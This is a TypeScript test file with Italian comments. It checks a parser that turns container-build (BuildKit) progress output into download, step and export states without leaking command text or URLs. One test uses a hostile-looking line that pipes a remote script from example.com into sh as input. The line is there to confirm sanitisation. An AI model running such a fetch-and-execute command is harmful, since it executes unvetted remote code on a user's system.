// OBD3 (fase onboarding-b-dettagli): il parse dell'avanzamento del build
// dell'immagine, PURO — lo stderr di `container build --progress plain`
// (formato BuildKit `#N`) riga per riga: il download della base (per
// digest, con la SOMMA su tutti i digest), l'estrazione, i passi del
// Dockerfile [n/m], l'export. La fixture è l'uscita VERA della CLI 1.7.1
// (copiata alla lettera): mai testo di comandi, mai URL in USCITA —
// all'utente arrivano solo l'attività e i numeri.
import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

const { parseBuildProgress } = await import('../build-progress')
import type { BuildProgress } from '../build-progress'

/** la fixture VERA: lo stderr di `container build --progress plain --no-cache` della 1.7.1 */
const FIXTURE = readFileSync(
  join(import.meta.dirname, 'fixtures', 'container-1.7.1-build-plain.txt'),
  'utf8'
)

/** la vista PUBBLICA del progresso (i cinque campi del contratto; la memoria dei digest è interna) */
const pub = (p: BuildProgress): BuildProgress => ({ activity: p.activity, step: p.step, steps: p.steps, bytes: p.bytes, total: p.total })

const PREPARING: BuildProgress = { activity: 'preparing', step: null, steps: null, bytes: null, total: null }

describe('OBD3 parseBuildProgress (PURO): la fixture vera, riga per riga', () => {
  it('la fixture intera: preparing → downloading (fino a 4090000 su 4090000) → extracting → running 1/4, 2/4, 3/4 → exporting', () => {
    const activities: string[] = []
    let p: BuildProgress | null = null
    let lastDownload: BuildProgress | null = null
    for (const line of FIXTURE.split('\n')) {
      p = parseBuildProgress(p, line)
      if (!activities.length || activities[activities.length - 1] !== p.activity) activities.push(p.activity)
      if (p.activity === 'downloading') lastDownload = p
    }
    // l'ordine delle attività vere della fixture (il formato #N di BuildKit)
    expect(activities).toEqual(['preparing', 'downloading', 'extracting', 'running', 'exporting'])
    // il download della base: 1.05MB → 4.09MB, decimali, fino al pieno
    expect(lastDownload).toMatchObject({ bytes: 4_090_000, total: 4_090_000 })
    // gli ultimi passi visti: 3/4 (l'export non ha n/m)
    expect(p).toMatchObject({ activity: 'exporting', step: 3, steps: 4 })
  })

  it('i passi del Dockerfile contano anche il FROM: [linux/arm64 2/4] → step 2 di 4', () => {
    const p = parseBuildProgress(PREPARING, '#6 [linux/arm64 2/4] RUN apk add --no-cache curl')
    expect(p).toMatchObject({ activity: 'running', step: 2, steps: 4 })
    // anche senza piattaforma: [2/4]
    const q = parseBuildProgress(PREPARING, '#6 [2/4] COPY . /app')
    expect(q).toMatchObject({ activity: 'running', step: 2, steps: 4 })
  })

  it('le righe dei COMANDI (uscita di RUN, fetch, transferring) non cambiano lo stato', () => {
    for (const line of [
      '#6 2.131 (1/10) Installing ca-certificates (20261020-r0)',
      '#6 0.152 fetch https://dl-cdn.alpinelinux.org/alpine/v3.20/main/aarch64/APKINDEX.tar.gz',
      '#2 transferring dockerfile: 135B 0.0s done',
      '#5 0.282 uno',
      '#8 DONE 0.8s',
      ''
    ]) {
      expect(pub(parseBuildProgress(PREPARING, line))).toEqual(PREPARING)
    }
  })

  it('extracting sha256: → extracting; exporting e sending tarball → exporting', () => {
    expect(parseBuildProgress(PREPARING, '#4 extracting sha256:3f26bc2dec0b515f1c2818f6e13a8f1da1f88179a008445d4e587233386bff78').activity).toBe('extracting')
    expect(parseBuildProgress(PREPARING, '#8 exporting to oci image format').activity).toBe('exporting')
    expect(parseBuildProgress(PREPARING, '#8 sending tarball').activity).toBe('exporting')
  })
})

describe('OBD3: il download della base — per digest, con la SOMMA su tutti i digest', () => {
  const A = 'a'.repeat(64)
  const B = 'b'.repeat(64)

  it('una riga sha256 X / Y → downloading, coi byte decimali (1.05MB = 1050000)', () => {
    const p = parseBuildProgress(PREPARING, `#4 sha256:${A} 1.05MB / 4.09MB 0.2s`)
    expect(p).toMatchObject({ activity: 'downloading', bytes: 1_050_000, total: 4_090_000 })
    // cresce
    const q = parseBuildProgress(p, `#4 sha256:${A} 3.15MB / 4.09MB 0.3s`)
    expect(q).toMatchObject({ bytes: 3_150_000, total: 4_090_000 })
  })

  it('due digest con righe ALTERNATE → bytes e total sono la SOMMA (percentuale vera)', () => {
    let p: BuildProgress | null = null
    p = parseBuildProgress(p, `#4 sha256:${A} 1MB / 2MB 0.1s`)
    expect(p).toMatchObject({ bytes: 1_000_000, total: 2_000_000 })
    p = parseBuildProgress(p, `#4 sha256:${B} 500kB / 3MB 0.2s`)
    // A(1MB/2MB) + B(0.5MB/3MB) = 1.5MB su 5MB
    expect(p).toMatchObject({ bytes: 1_500_000, total: 5_000_000 })
    p = parseBuildProgress(p, `#4 sha256:${A} 2MB / 2MB 0.3s done`)
    expect(p).toMatchObject({ bytes: 2_500_000, total: 5_000_000 })
    p = parseBuildProgress(p, `#4 sha256:${B} 3MB / 3MB 0.4s done`)
    expect(p).toMatchObject({ bytes: 5_000_000, total: 5_000_000 })
  })

  it('le unità di BuildKit, decimali: B, kB, MB, GB', () => {
    expect(parseBuildProgress(PREPARING, `#4 sha256:${A} 512B / 1kB 0.0s`)).toMatchObject({ bytes: 512, total: 1_000 })
    expect(parseBuildProgress(PREPARING, `#4 sha256:${A} 1.5GB / 2GB 0.0s`)).toMatchObject({ bytes: 1_500_000_000, total: 2_000_000_000 })
  })

  it('le righe sha256 SENZA formato di download (resolve, layout) non sono download', () => {
    for (const line of [
      '#4 resolve docker.io/library/alpine:3.20@sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc',
      '#4 oci-layout://docker.io/library/alpine:3.20@sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc'
    ]) {
      expect(pub(parseBuildProgress(PREPARING, line))).toEqual(PREPARING)
    }
    // l'export del MANIFEST è un exporting (col sha256 dentro, ma senza X / Y)
    const manifest = parseBuildProgress(PREPARING, '#8 exporting manifest sha256:11112eaa2aac1257c84ae1bfa93af8e6478fa3a7b9e30356d3cf1e26997047a2 0.0s done')
    expect(manifest.activity).toBe('exporting')
    expect(manifest.activity).not.toBe('downloading')
  })
})

describe('OBD3: in USCITA mai il testo dei comandi, mai URL', () => {
  it('nessun campo dell\'uscita contiene RUN, apk, http o sha256 (tutta la fixture)', () => {
    let p: BuildProgress | null = null
    for (const line of FIXTURE.split('\n')) {
      p = parseBuildProgress(p, line)
      const dump = JSON.stringify(p)
      expect(dump, line).not.toMatch(/RUN|apk|http|sha256/)
    }
  })

  it('una riga ostile (URL, comandi, digest) non finisce mai nell\'uscita', () => {
    const p = parseBuildProgress(PREPARING, '#9 [linux/arm64 9/9] RUN curl -fsSL https://example.com/x | sh')
    expect(JSON.stringify(p)).not.toMatch(/RUN|curl|http|example/)
    expect(p).toMatchObject({ activity: 'running', step: 9, steps: 9 })
  })
})
